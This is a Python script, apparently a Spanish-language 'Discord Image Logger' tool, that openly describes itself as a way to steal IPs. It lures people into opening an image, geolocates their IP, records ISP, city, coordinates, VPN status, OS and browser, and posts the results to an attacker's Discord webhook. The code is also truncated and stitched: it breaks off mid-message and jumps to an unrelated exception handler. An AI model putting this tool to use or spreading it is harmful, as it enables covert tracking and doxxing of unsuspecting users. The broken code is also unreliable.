# Image Logger
# Por Team C00lB0i/C00lB0i | https://github.com/OverPowerC
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser  # ¡Corregido!

__app__ = "Discord Image Logger"
__description__ = "Una aplicación simple que permite robar IPs y más abusando de la función 'Abrir original' de Discord"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # CONFIGURACIÓN BASE
    "webhook": "https://discord.com/api/webhooks/1546229226355818529/0IjhLUnVPgXxVc56-iHUmbIG7MeVkJvyQ",  # ¡Cambia esto por tu propio webhook!
    "image": "https://m.media-amazon.com/images/MV5BMzlMThBhNjYtMjU0ZC00NDY5LTgyMDUtN2M3NzU4YjU0MDU4",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Este navegador ha sido poseído por el Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://tu-enlace.aqui"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"¡Ocurrió un error al intentar registrar una IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Enlace Enviado",
                    "color": config["color"],
                    "description": f"¡Se envió un enlace de **Image Logger** en un chat!\nPuede que recibas una IP pronto.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Plataforma:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return
    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""
    os, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Registrada",
                "color": config["color"],
                "description": f"""**¡Un usuario abrió la imagen original!**
**Endpoint:** `{endpoint}`
**Info de IP:**
> **IP:** `{ip if ip else 'Desconocida'}`
> **Proveedor:** `{info['isp'] if info['isp'] else 'Desconocido'}`
> **ASN:** `{info['as'] if info['as'] else 'Desconocido'}`
> **País:** `{info['country'] if info['country'] else 'Desconocido'}`
> **Región:** `{info['regionName'] if info['regionName'] else 'Desconocido'}`
> **Ciudad:** `{info['city'] if info['city'] else 'Desconocido'}`
> **Coordenadas:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Aproximada' if not coords else 'Precisa, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Zona Horaria:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Móvil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Posible' if info['hosting'] else 'Falso'}`
**Info de PC:**
> **SO:** `{os}`
> **Navegador:** `{browser}`
**User Agent:**
    except KeyboardInterrupt:
        print("\nEl servidor se ha detenido.")
        server.shutdown()
